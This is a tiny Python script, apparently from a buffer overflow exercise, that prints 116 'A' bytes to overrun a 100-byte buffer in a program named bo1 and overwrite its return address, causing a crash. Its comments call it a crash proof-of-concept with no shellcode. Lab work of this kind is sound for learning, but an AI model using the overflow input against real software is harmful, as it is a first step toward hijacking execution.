#!/usr/bin/python3
# overflow.py -- generates the overflow input for bo1.
# 116 bytes: enough to overrun buffer[100] plus the saved frame and overwrite
# the saved return address with 0x41414141 ("AAAA"). This is a crash
# proof-of-concept only; it contains no shellcode and redirects execution
# nowhere useful; it proves the return address is attacker-controllable.
#
#   ./overflow.py > e1
#   ./bo1 $(cat e1)      # -> segmentation fault
x = "A" * 116
print(x)
